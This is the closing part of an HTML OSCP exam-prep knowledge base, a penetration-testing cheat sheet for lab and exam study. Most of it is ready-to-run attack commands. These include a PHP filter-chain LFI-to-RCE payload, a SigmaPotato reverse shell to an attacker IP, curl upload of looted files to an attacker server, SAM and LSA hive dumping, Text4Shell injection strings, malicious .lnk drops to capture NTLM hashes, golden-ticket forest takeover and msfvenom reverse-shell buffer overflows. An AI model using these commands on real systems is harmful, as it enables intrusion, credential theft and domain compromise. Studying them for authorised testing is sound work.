+<h2 id="v0-[parity3-lfi-filterchain]-lfi-rce-with-no-writable-log-php-filter-chain">[PARITY3-LFI-FILTERCHAIN]  LFI → RCE with NO writable log (php filter chain)<a class="anchor" href="#v0-[parity3-lfi-filterchain]-lfi-rce-with-no-writable-log-php-filter-chain">#</a></h2>
+<pre><code># when you have a pure LFI (?page=) but no log/upload to poison — generate a filter-chain payload:
+python3 php_filter_chain_generator.py --chain &#x27;&lt;?php system($_GET[&quot;c&quot;]); ?&gt;&#x27;
+# paste the produced php://filter... string into the LFI param, then add &amp;c=id   ([WEB-LFI])</code></pre>
+<h2 id="v0-[parity3-ffuf]-ffuf-flags-worth-knowing">[PARITY3-FFUF]  ffuf flags worth knowing<a class="anchor" href="#v0-[parity3-ffuf]-ffuf-flags-worth-knowing">#</a></h2>
+<pre><code>ffuf -w list.txt -u http://$T/FUZZ -ac              # -ac = AUTO-calibrate (auto-filters junk responses)
+ffuf -w list.txt -u http://$T/FUZZ -mc all -fs 0    # -mc all match every code, then filter by size
+ffuf -w list.txt -u http://$T/FUZZ -e .php,.txt,.bak -recursion
+ffuf -w users.txt -u http://$T/admin/FUZZ.php -b &quot;PHPSESSID=xxx&quot; -fw 2644   # authenticated fuzz + filter words</code></pre>
+<h2 id="v0-[parity3-kerberos]-ticket-workflow-mostly-in-[kerberos-quick]-completing-it">[PARITY3-KERBEROS]  ticket workflow (mostly in <code class="tag">[KERBEROS-QUICK]</code>, completing it)<a class="anchor" href="#v0-[parity3-kerberos]-ticket-workflow-mostly-in-[kerberos-quick]-completing-it">#</a></h2>
+<pre><code>impacket-getTGT $DOMAIN/$U:&#x27;PASS&#x27;                    # → $U.ccache
+export KRB5CCNAME=$(realpath $U.ccache)              # tell tools to use it
+klist                                               # show tickets you hold
+impacket-ticketConverter $U.kirbi $U.ccache          # .kirbi (Windows/Rubeus) → .ccache (Linux)
+impacket-mssqlclient -k $T.$DOMAIN                   # -k = use the Kerberos ticket (no password)</code></pre>
+<h2 id="v0-[parity3-misc]-small-but-useful">[PARITY3-MISC]  small but useful<a class="anchor" href="#v0-[parity3-misc]-small-but-useful">#</a></h2>
+<pre><code>snmpwalk -v2c -c public $T nsExtendObjects           # scripts snmpd runs (often as root → privesc lead)
+hashcat -a 3 -m 0 hash.txt ?u?l?l?l?d?d?d?d           # mask attack (bruteforce a pattern)
+hashcat -a 6 -m 0 hash.txt wordlist.txt ?d?d?d       # hybrid: wordlist + appended mask
+# DirtyCOW (old kernels) compile:  gcc -pthread dirty.c -o dirty -lcrypt ; ./dirty &lt;newpass&gt;
+# Shocker (CGI shellshock container/host file read):  ./shocker &lt;path-to-read&gt;
+# start services on Kali to receive:  sudo systemctl start ssh   (then scp target→you)</code></pre>
+<blockquote><strong>Honesty note on &quot;everything&quot;:</strong> this KB carries the <strong>commands you actually type</strong> (the 80/20) and links the long tail (<code class="tag">[RESOURCES]</code>). Multi-file Obsidian repos (fatalxs, LeonardoE95&#x27;s module notes) can&#x27;t be fully mined from a README, and *no* finite notes file holds every flag of every tool — that&#x27;s what GTFOBins/HackTricks/<code>--help</code> are for. The systematic sweeps are done; remaining micro-gaps are best found by <strong>using this on real boxes</strong>.</blockquote>
+<hr>
+<h1 id="v0-[addendum-parity-4]-more-from-a-pen-200-aligned-cheatsheet-final-parity">[ADDENDUM-PARITY-4]  more from a PEN-200-aligned cheatsheet (final parity)<a class="anchor" href="#v0-[addendum-parity-4]-more-from-a-pen-200-aligned-cheatsheet-final-parity">#</a></h1>
+<h2 id="v0-[parity4-transfer]-upload-server-target-your-kali">[PARITY4-TRANSFER]  upload server (target → your Kali)<a class="anchor" href="#v0-[parity4-transfer]-upload-server-target-your-kali">#</a></h2>
+<pre><code>pip3 install uploadserver                             # one time
+python3 -m uploadserver 8000                          # Kali: accepts uploads at /upload
+# from target:  curl.exe http://&lt;KaliIP&gt;:8000/upload -F files=@C:\loot\file.zip   (Linux: curl -F ...)</code></pre>
+<h2 id="v0-[parity4-sigmapotato]-sigmapotato-newest-potato-try-when-godpotatoprintspoofer-fail">[PARITY4-SIGMAPOTATO]  SigmaPotato (newest Potato — try when GodPotato/PrintSpoofer fail)<a class="anchor" href="#v0-[parity4-sigmapotato]-sigmapotato-newest-potato-try-when-godpotatoprintspoofer-fail">#</a></h2>
+<pre><code>.\SigmaPotato.exe &quot;net localgroup Administrators &lt;you&gt; /add&quot;    # SeImpersonate → run as SYSTEM
+.\SigmaPotato.exe --revshell &lt;KaliIP&gt; 4444                      # direct reverse shell</code></pre>
+<p>Order to try SeImpersonate→SYSTEM: PrintSpoofer → GodPotato → <strong>SigmaPotato</strong> → JuicyPotatoNG/RoguePotato (<code class="tag">[WINDOWS-TOKENS]</code>).</p>
+<h2 id="v0-[parity4-ligolo]-ligolo-ng-current-syntax-newer-than-ip-tuntap">[PARITY4-LIGOLO]  Ligolo-ng current syntax (newer than <code>ip tuntap</code>)<a class="anchor" href="#v0-[parity4-ligolo]-ligolo-ng-current-syntax-newer-than-ip-tuntap">#</a></h2>
+<pre><code>sudo ligolo-proxy -selfcert                            # on Kali
+./agent -connect &lt;KaliIP&gt;:11601 -ignore-cert           # on the pivot host
+# in the ligolo console:
+interface_create --name ligolo
+start --tun ligolo
+route_add --name ligolo --route 172.16.247.0/24        # then run tools natively at 172.16.247.x</code></pre>
+<h2 id="v0-[parity4-winloot]-windows-credhive-dump-extras">[PARITY4-WINLOOT]  Windows cred/hive dump extras<a class="anchor" href="#v0-[parity4-winloot]-windows-credhive-dump-extras">#</a></h2>
+<pre><code>reg save hklm\sam sam &amp; reg save hklm\system system &amp; reg save hklm\security security   # +security hive (LSA/cached)
+impacket-secretsdump -sam sam -system system -security security LOCAL                    # parse offline
+Get-WinEvent -MaxEvents 30 | findstr backup            # event logs sometimes leak creds/hints</code></pre>
+<h2 id="v0-[parity4-enable-rdp]-turn-on-rdp-after-youre-admin-for-a-gui-stable-access">[PARITY4-ENABLE-RDP]  turn on RDP after you&#x27;re admin (for a GUI / stable access)<a class="anchor" href="#v0-[parity4-enable-rdp]-turn-on-rdp-after-youre-admin-for-a-gui-stable-access">#</a></h2>
+<pre><code>reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=Yes
+net localgroup &quot;Remote Desktop Users&quot; &lt;you&gt; /add</code></pre>
+<h2 id="v0-[parity4-ad-extra]-powerview-trust-enumeration-extras">[PARITY4-AD-EXTRA]  PowerView + trust enumeration extras<a class="anchor" href="#v0-[parity4-ad-extra]-powerview-trust-enumeration-extras">#</a></h2>
+<pre><code>setspn -L &lt;svcaccount&gt;                                 # SPNs of an account (kerberoast targets)
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-NetSession -ComputerName files04                   # who&#x27;s logged on where (lateral targeting)
+Get-ObjectAcl -Identity &lt;user&gt; | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier
+Convert-SidToName S-1-5-21-...-1104                     # SID → name
+Find-DomainShare ; Find-LocalAdminAccess               # shares / where you&#x27;re local admin
+nltest /domain_trusts /v                               # enumerate domain trusts</code></pre>
+<h2 id="v0-[parity4-credsniff]-linux-catch-credscron-in-real-time-on-a-shell">[PARITY4-CREDSNIFF]  Linux: catch creds/cron in real time (on a shell)<a class="anchor" href="#v0-[parity4-credsniff]-linux-catch-credscron-in-real-time-on-a-shell">#</a></h2>
+<pre><code>watch -n 1 &quot;ps -aux | grep -i pass&quot;                    # spot a process passing a password on its cmdline
+sudo tcpdump -i lo -A | grep -i pass                   # sniff loopback (local service auth)
+grep CRON /var/log/syslog                              # see what cron runs (privesc lead)</code></pre>
+<h2 id="v0-[parity4-misc]">[PARITY4-MISC]<a class="anchor" href="#v0-[parity4-misc]">#</a></h2>
+<pre><code>snmpbulkwalk -v2c -c public $IP                         # faster than snmpwalk; sudo apt install snmp-mibs-downloader for readable OIDs
+# Golden Ticket across a trust (child→parent): impacket-ticketer ... -extra-sid &lt;parent-Enterprise-Admins-SID&gt; Administrator</code></pre>
+<hr>
+<h1 id="v0-[addendum-parity-5]-8-challenge-lab-sweep-secura-medtech-oscp-abc-zeus-poseidon-laser">[ADDENDUM-PARITY-5]  8-challenge-lab sweep (Secura, Medtech, OSCP-A/B/C, Zeus, Poseidon, Laser)<a class="anchor" href="#v0-[addendum-parity-5]-8-challenge-lab-sweep-secura-medtech-oscp-abc-zeus-poseidon-laser">#</a></h1>
+<blockquote>Went through all 8 OSCP challenge-lab walkthroughs. <strong>~95% was already covered</strong> — these are the genuine additions. The labs also use many <strong>app-specific RCEs</strong> (Aerospike CVE-2020-13151, Mobile Mouse, Usermin 1.820, Vesta CP, FreeSWITCH mod_event_socket, unisql) — all handled by the generic flow: **identify version → <code>searchsploit</code> → run the PoC** (<code class="tag">[EXPLOIT-RESEARCH]</code>). Don&#x27;t memorize them.</blockquote>
+<h2 id="v0-[web-text4shell]-cve-2022-42889-text4shell-apache-commons-text-1519">[WEB-TEXT4SHELL]  CVE-2022-42889 (Text4Shell — Apache Commons Text 1.5–1.9)<a class="anchor" href="#v0-[web-text4shell]-cve-2022-42889-text4shell-apache-commons-text-1519">#</a></h2>
+<p>Log4Shell&#x27;s cousin: string interpolation → RCE. Drop into any reflected input / search field:</p>
+<pre><code>${script:javascript:java.lang.Runtime.getRuntime().exec(&#x27;id&#x27;)}
+${url:UTF-8:http://&lt;yourIP&gt;/x}   ${dns:address|&lt;yourIP&gt;}     # confirm with an OOB callback first</code></pre>
+<p>Public PoC exists; pair with <code class="tag">[WEB-CMDINJ]</code>.</p>
+<h2 id="v0-[enum-jdwp]-java-debug-wire-protocol-exposed-debug-port-often-80008787high">[ENUM-JDWP]  Java Debug Wire Protocol (exposed debug port — often 8000/8787/high)<a class="anchor" href="#v0-[enum-jdwp]-java-debug-wire-protocol-exposed-debug-port-often-80008787high">#</a></h2>
+<p>An open <strong>JDWP</strong> port = RCE (attach a debugger, execute code). Detect: <code>nmap -sV</code> shows *&quot;Java Debug Wire Protocol&quot;*. Exploit: <code>jdwp-shellifier.py</code> (or EDB 46501) → command exec → reverse shell.</p>
+<h2 id="v0-[windows-creds-putty]-stored-session-creds-winpeas-finds-these">[WINDOWS-CREDS-PUTTY]  stored session creds (winPEAS finds these)<a class="anchor" href="#v0-[windows-creds-putty]-stored-session-creds-winpeas-finds-these">#</a></h2>
+<pre><code>reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; /s     # PuTTY proxy password often PLAINTEXT
+# also: WinSCP (registry/.ini), FileZilla recentservers.xml / sitemanager.xml → saved FTP/SFTP creds</code></pre>
+<h2 id="v0-[smb-slinky]-nxc-slinky-auto-drop-a-malicious-lnk-in-a-writable-share-capture-ntlm">[SMB-SLINKY]  nxc slinky — auto-drop a malicious .lnk in a writable share → capture NTLM<a class="anchor" href="#v0-[smb-slinky]-nxc-slinky-auto-drop-a-malicious-lnk-in-a-writable-share-capture-ntlm">#</a></h2>
+<pre><code>nxc smb $IP -u u -p p -M slinky -o NAME=important SERVER=&lt;yourIP&gt;   # drops a .lnk into writable shares
+# then run `responder -A` / `ntlmrelayx` to catch the NetNTLMv2 when a user browses the folder</code></pre>
+<p>Automates the <code>.scf</code>/<code>.url</code>/<code>.lnk</code> drop from <code class="tag">[SMB-ATTACK]</code>. ⚠️ Exam: capturing via a file the user opens is fine; Responder <strong>poisoning</strong> is not (<code class="tag">[EXAM-RULES-2026]</code>).</p>
+<h2 id="v0-[pcap-analysis]-you-found-a-pcappcapng-mine-it-for-creds">[PCAP-ANALYSIS]  you found a .pcap/.pcapng → mine it for creds<a class="anchor" href="#v0-[pcap-analysis]-you-found-a-pcappcapng-mine-it-for-creds">#</a></h2>
+<pre><code>wireshark file.pcapng        # GUI: right-click → Follow TCP/HTTP Stream; File → Export Objects → HTTP
+tshark -r file.pcap -Y &#x27;http.authorization || ftp || telnet&#x27; -T fields -e text   # CLI quick pull</code></pre>
+<p>Look for: HTTP basic-auth, FTP/telnet plaintext, form logins, SMB/NTLM hashes (→ crack). Also <code>strings file.pcap | grep -i pass</code>.</p>
+<h2 id="v0-[ad-trust]-child-parent-forest-trust-escalation-poseidon-style">[AD-TRUST]  child → parent forest-trust escalation (Poseidon-style)<a class="anchor" href="#v0-[ad-trust]-child-parent-forest-trust-escalation-poseidon-style">#</a></h2>
+<p>If you own a <strong>child</strong> domain (have its <code>krbtgt</code> hash) you can forge into the <strong>parent/forest root</strong> via SID history:</p>
+<pre><code>nltest /domain_trusts /v                                              # map trusts + get domain SIDs
+impacket-secretsdump -just-dc-user krbtgt &lt;child&gt;/&lt;u&gt;:&lt;p&gt;@&lt;childDC&gt;    # child krbtgt hash
+impacket-ticketer -nthash &lt;krbtgt&gt; -domain &lt;child&gt; -domain-sid &lt;child-SID&gt; \
+    -extra-sid &lt;parent-SID&gt;-519 Administrator                         # golden ticket + Enterprise Admins SID
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec &lt;child&gt;/Administrator@&lt;parentDC&gt; -k -no-pass          # own the forest root</code></pre>
+<p>The <code>-extra-sid ...-519</code> injects the <strong>parent&#x27;s Enterprise Admins</strong> into your ticket = forest compromise.</p>
+<hr>
+<h1 id="v0-[bof-deprecated]-buffer-overflow-not-on-the-current-oscp-exam">[BOF-DEPRECATED]  Buffer Overflow — ⚠️ NOT on the current OSCP+ exam<a class="anchor" href="#v0-[bof-deprecated]-buffer-overflow-not-on-the-current-oscp-exam">#</a></h1>
+<p><strong>The classic 25-pt Windows stack-BOF box was removed.</strong> Know the *concept* for general knowledge; <strong>do NOT spend prep time here.</strong> Compact reference only:</p>
+<pre><code>1 Fuzz until crash → 2 msf-pattern_create -l N → send → find EIP → msf-pattern_offset -q &lt;val&gt;
+3 Control EIP (offset) → 4 find bad chars (send \x00..\xff, compare in debugger, remove dupes)
+5 !mona jmp -r esp -cpb &#x27;&lt;badchars&gt;&#x27; → pick a JMP ESP address (little-endian)
+6 msfvenom -p windows/shell_reverse_tcp LHOST LPORT -b &#x27;&lt;badchars&gt;&#x27; -f c
+7 buffer = &quot;A&quot;*offset + JMP_ESP + &quot;\x90&quot;*16 (NOP sled) + shellcode → nc -lvnp → win</code></pre>
+<p>If a modern exam box ever needs a memory bug, it&#x27;ll come with source or a clear public PoC — treat it as <code class="tag">[EXPLOIT-RESEARCH]</code> + <code class="tag">[FIXING-EXPLOITS]</code>, not hand-crafted stack smashing.</p>
+<hr>
+<p>*End Volume 8. This is your exam-day command center — combine with <code class="tag">[EXAM-DAY-FLOW]</code> (Vol 7) and <code class="tag">[FINAL-DAY-QUICK-REFERENCE]</code> (Vol 6).*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
